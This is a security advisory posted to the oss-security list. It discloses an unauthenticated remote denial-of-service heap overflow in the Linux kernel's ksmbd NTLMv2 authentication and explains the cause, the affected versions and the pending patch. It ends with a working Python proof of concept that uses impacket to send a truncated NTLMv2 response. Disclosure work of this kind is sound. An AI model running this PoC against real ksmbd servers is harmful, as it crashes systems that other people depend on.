@@ -1,0 +1,63 @@
+
+Date: Wed, 4 Jan 2023 17:35:09 +0100
+From: Hrvoje Mišetić <misetichrvoje@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: will@...lsroot.io
+Subject: Linux kernel: Unauthenticated remote DOS in ksmbd NTLMv2 authentication
+
+There is a heap overflow bug in ksmbd_decode_ntlmssp_auth_blob in which nt_len
+can be less than CIFS_ENCPWD_SIZE. This results in a negative blen argument
+for ksmbd_auth_ntlmv2, where it calls memcpy using blen on memory allocated
+by kmalloc(blen + CIFS_CRYPTO_KEY_SIZE). Note that CIFS_ENCPWD_SIZE is 16
+and CIFS_CRYPTO_KEY_SIZE is 8. We believe this bug can only result in a
+remote DOS and not privilege escalation nor RCE, as the heap overflow occurs
+when blen is in range (-8, -1]. The resulting overflow will be too large,
+and will lead to a kernel panic. When blen is -8, kmalloc returns
+ZERO_SIZE_PTR which will cause a null dereference, but the kernel will oops
+and will usually continue to function. This bug has existed since 5.15-rc1
+and is still present in the upstream source tree, having just been patched
+in https://github.com/cifsd-team/ksmbd and is awaiting merging - the commit
+ID is 8824b7af409f51f1316e92e9887c2fd48c0b26d6.
+
+We have tested this bug on Ubuntu 20.04 HWE and 22.04 (both running on
+5.15.0-56-generic) and can remotely panic the OS immediately. Any attacker
+that can access the ksmbd SMB port can easily cause a kernel panic. Note that
+while the attacker has to know a valid username for the service, it does not
+need to know the password as the bug happens in the challenge-response phase
+of ntlmv2 protocol, making this an unauthenticated attack.
+
+Below is a POC to trigger the bug.
+------------------------------------------------------------------------------
+#!/usr/bin/python3
+from impacket.smbconnection import SMBConnection
+import functools
+import impacket.ntlm
+
+# using impacket-0.10.0
+
+user = "test"
+pw = "test"
+domain = "localhost"
+address = "127.0.0.1"
+target_ip = "127.0.0.1"
+port = "445"
+
+def post_function(function, postfunction):
+    @functools.wraps(function)
+    def run(*args, **kwargs):
+        resp = function(*args, **kwargs)
+        return postfunction(resp)
+    return run
+
+def post_computeResponseNTLMv2_hook(resp):
+    return ('A' * 10, resp[1], resp[2])
+
+impacket.ntlm.computeResponseNTLMv2 = post_function(
+    impacket.ntlm.computeResponseNTLMv2, post_computeResponseNTLMv2_hook)
+
+smbClient = SMBConnection(address, target_ip, port)
+smbClient.login(user, pw, domain)
+------------------------------------------------------------------------------
+Best,
+Hrvoje Mišetić
+William Liu
